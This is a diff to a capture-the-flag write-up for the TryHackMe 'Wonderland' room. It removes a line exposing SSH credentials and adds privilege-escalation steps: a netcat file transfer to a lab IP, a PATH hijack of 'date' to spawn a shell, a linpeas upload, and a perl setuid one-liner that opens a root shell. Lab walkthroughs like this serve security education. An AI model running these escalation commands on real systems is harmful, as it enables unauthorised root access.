@@ -72,11 +72,7 @@ After looking at some more, I realise: wait ... I've been going in the opposite 
 
 So we must go on ... but where? I don't know. 
 
-Looking around, we have: `alice:HowDothTheLittleCrocodileImproveHisShiningTail` in the source. [hmmmm](https://en.wikipedia.org/wiki/How_Doth_the_Little_Crocodile)
-
 I was stuck for a while, and then stumbled upon the fact that its ssh `username:password`. "Open the door" makes sense now lmao.
-
-
 
 ## Foothold
 
@@ -107,7 +103,7 @@ alice@wonderland:/home$ cd tryhackme/
 -bash: cd: tryhackme/: Permission denied
 ```
 
-I tried locating `user.txt`, but I can't `locate` anything. Looking at the hint, it could be in `/root/user.txt`. It is!
+I tried locating `user.txt`, but I can't `locate` anything. Looking at the hint on TryHackMe, it could be in `/root/user.txt`. It is!
 
 ```
 rabbit@wonderland:/home/rabbit$ cat /root/user.txt
@@ -132,7 +128,7 @@ Ah so we can execute the script as rabbit. `alice@wonderland:~$ sudo -u rabbit /
 
 This means we can spawn a shell as rabbit!
 
-But ... we do not have any permissions to write the file. So how? Well, this is something called `python library hijacking`. Take a wild guess to what we are going to do.
+But ... we do not have any permissions to write the file. So how? Well, this is something called **python library hijacking**. Take a wild guess to what we are going to do.
 
 Yeah, create a file called `random.py`, essentially overriding the actual random library. Lesgooo!
 
@@ -150,7 +146,7 @@ rabbit@wonderland:/home/rabbit$ ls
 teaParty
 ```
 
-which has a set bit ...!
+which has a set bit ...!?
 
 ```
 rabbit@wonderland:/home/rabbit$ ./teaParty 
@@ -178,5 +174,75 @@ sudo: unknown user: #-1
 sudo: unable to initialize policy plugin
 ```
 
-So, back to reverse engineering it is! I wanted to start off with `strings`, but it does not want to work. 
+So, back to reverse engineering it is! I wanted to start off with `strings`, but it does not want to work, since strings is not present on that machine. So, I need to transfer the file to my machine, then extract out the information I need.
 
+For this, we start `nc` on both; 
+
+`rabbit@wonderland:/home/rabbit$ nc 10.8.150.214 1234 < teaParty`
+
+Explaination: netcat tries to connect to the IP `10.8.150.214` on the port `1234` using `TCP`, and takes in the file as the input.
+
+`❯ nc -lnvp 1234 > temp`
+
+Explaination: netcat *listens* on the port `1234` on your machine, outputting all the contents into a file called `temp`.
+
+Ok! Doing strings, we see: `/bin/echo -n 'Probably by ' && date --date='next hour' -R`
+
+We can make use of the `date` library in C. Also, no matter our input, we get `Segmentation fault (core dumped)`, as its in the string. Very sneaky! Now, we want it to execute the `date` file. We can just write: `bash` in it and make it executable by using `chmod +x date`.
+
+```
+rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:/home/rabbit$ 
+```
+
+:D Inside of `/home/hatter`, we get
+
+```
+hatter@wonderland:/home/hatter$ cat password.txt 
+<PASSWORD>
+```
+
+Now, we can login as hatter normally, instead of this convoluted mess. 
+
+(We are still in alice's random's rabbit's teaParty shell lmao)
+
+Okay take a deep breath in. Fresh shell! However ...
+
+```
+hatter@wonderland:~$ sudo -l
+[sudo] password for hatter: 
+Sorry, user hatter may not run sudo on wonderland.
+```
+
+SMH.
+
+Time for linpeas again!
+
+```
+❯ scp ~/Desktop/Tools/linpeas.sh hatter@10.10.27.106:~
+hatter@10.10.27.106's password: 
+linpeas.sh                    100%  313KB 188.7KB/s   00:01    
+```
+
+Okay so the below pops out, talking about suid bit setting capabilities:
+
+```
+Files with capabilities:
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+
+Perl looks tasty, so [gtfobins](https://gtfobins.github.io/gtfobins/perl/#capabilities) tells us the following.
+
+`cp $(which perl) .`
+
+```
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# whoami
+root
+```
+
+EASY!
